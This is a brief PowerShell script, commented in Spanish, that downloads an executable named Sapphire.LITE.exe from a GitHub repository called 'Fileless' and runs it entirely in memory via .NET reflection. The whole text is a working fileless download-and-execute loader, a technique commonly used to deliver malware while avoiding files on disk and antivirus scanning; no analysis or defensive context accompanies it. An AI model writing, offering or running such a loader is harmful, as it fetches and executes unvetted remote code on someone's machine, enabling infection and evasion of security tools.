$url = "https://github.com/AL4AROX/Fileless/raw/refs/heads/main/Sapphire.LITE.exe"
$exeBytes = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content

# Cargar el ensamblado en memoria y ejecutar
$assembly = [System.Reflection.Assembly]::Load($exeBytes)
$entryPoint = $assembly.EntryPoint
if ($entryPoint -ne $null) {
    $entryPoint.Invoke($null, $null)
}
